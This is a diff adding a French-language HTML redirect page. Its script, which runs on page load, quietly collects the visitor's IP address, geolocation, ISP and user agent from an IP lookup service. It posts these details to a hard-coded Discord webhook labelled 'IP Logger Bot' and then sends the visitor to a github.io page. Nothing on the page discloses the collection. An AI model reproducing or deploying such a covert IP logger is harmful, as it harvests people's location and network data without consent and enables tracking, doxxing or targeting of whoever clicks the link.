@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirection...</title>
+  <!-- Redirection de secours si JavaScript est désactivé -->
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=https://kfcgaming.github.io/enzgal">
+  </noscript>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #121212;
+      color: #ffffff;
+    }
+    .loader {
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loader">
+    <h2>Redirection en cours...</h2>
+    <p>Veuillez patienter un instant.</p>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
+    const TARGET_URL = "https://kfcgaming.github.io/enzgal";
+
+    async function sendAndRedirect() {
+      try {
+        // Récupération de l'IP et données géolocalisées
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+
+        const payload = {
+          username: "IP Logger Bot",
+          avatar_url: "https://i.imgur.com/4M34hi2.png",
+          embeds: [
+            {
+              title: "🎯 Nouvelle visite & redirection",
+              color: 0x00ff55,
+              fields: [
+                { name: "🌐 Adresse IP", value: data.ip || "Inconnue", inline: true },
+                { name: "📍 Localisation", value: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}`, inline: true },
+                { name: "🏢 FAI / Opérateur", value: data.org || "Inconnu", inline: false },
+                { name: "💻 User-Agent", value: navigator.userAgent, inline: false }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        };
+
+        // Envoi de la requête au Webhook avec un timeout pour éviter de bloquer indéfiniment
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+      } catch (error) {
+        console.error("Erreur d'envoi :", error);
+      } finally {
+        // Redirection vers la page cible quoi qu'il arrive
+        window.location.href = TARGET_URL;
+      }
+    }
+
+    window.onload = sendAndRedirect;
+  </script>
+</body>
+</html>
